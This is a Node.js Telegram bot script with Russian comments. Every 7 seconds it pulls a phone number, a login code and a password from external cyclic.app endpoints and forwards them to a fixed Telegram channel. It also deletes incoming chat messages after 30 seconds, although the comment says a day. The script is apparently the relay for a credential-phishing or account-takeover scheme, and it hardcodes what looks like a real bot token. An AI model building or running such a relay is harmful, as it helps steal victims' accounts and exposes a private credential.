const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

const token = '6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI';

const bot = new TelegramBot(token, { polling: true });

// Функция для удаления сообщения по его идентификатору
async function deleteMessage(chatId, messageId) {
    try {
        await bot.deleteMessage(chatId, messageId);
        console.log(`Сообщение ${messageId} удалено`);
    } catch (error) {
        console.error('Ошибка при удалении сообщения:', error.message);
    }
}

// Обработчик новых сообщений в чате
bot.on('message', async (msg) => {
    // Здесь можно добавить логику, чтобы установить таймер удаления для нового сообщения
    const chatId = msg.chat.id;
    const messageId = msg.message_id;
    
    // Устанавливаем таймер удаления сообщения через день
    setTimeout(() => {
        deleteMessage(chatId, messageId);
    }, 30000); // 24 часа * 60 минут * 60 секунд * 1000 миллисекунд

    // Пока что мы не посылаем никаких ответов на сообщения
    // Мы просто ждём и удаляем сообщения через день
});

// В случае возникновения ошибки, выводим её в консоль
bot.on('polling_error', (error) => {
    console.error(error);
});

// async function fetchDataAndSendToUser(url, chatId) {
//     try {
//         const response = await axios.get(url);
//         const data = response.data;
//         bot.sendMessage(chatId, data);
//     } catch (error) {
//         console.error('Ошибка:', error);
//         bot.sendMessage(chatId, 'Произошла ошибка при получении данных. Попробуйте позже.');
//     }
// }

// bot.onText(/\/getphone/, (msg) => {
//     const chatId = msg.chat.id;
//     const url = 'https://blue-salamander-cape.cyclic.app/getPhone';
//     fetchDataAndSendToUser(url, chatId);
// });

// bot.onText(/\/getcode/, (msg) => {
//     const chatId = msg.chat.id;
//     const url = 'https://blue-salamander-cape.cyclic.app/getCode';
//     fetchDataAndSendToUser(url, chatId);
// });

// bot.onText(/\/getpassword/, (msg) => {
//     const chatId = msg.chat.id;
//     const url = 'https://blue-salamander-cape.cyclic.app/getPassword';
//     fetchDataAndSendToUser(url, chatId);
// });

async function fetchPhoneAutomatically() {
    const url = 'https://puce-attractive-firefly.cyclic.app/getPhone';
    try {
        const response = await axios.get(url);
        const data = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function fetchCodeAutomatically() {
    const url = 'https://puce-attractive-firefly.cyclic.app/getCode';
    try {
        const response = await axios.get(url);
        const data = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function fetchPasswordAutomatically() {
    const url = 'https://puce-attractive-firefly.cyclic.app/getPassword';
    try {
        const response = await axios.get(url);
        const data = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function sendRequestsInOrder() {
    let phoneData = await fetchPhoneAutomatically();
    let codeData = await fetchCodeAutomatically();
    let passwordData = await fetchPasswordAutomatically();

    console.log('Все запросы выполнены.');
    console.log('Phone Data:', phoneData);
    console.log('Code Data:', codeData);
    console.log('Password Data:', passwordData);

}

setInterval(() => {
    sendRequestsInOrder();
}, 7000);

sendRequestsInOrder();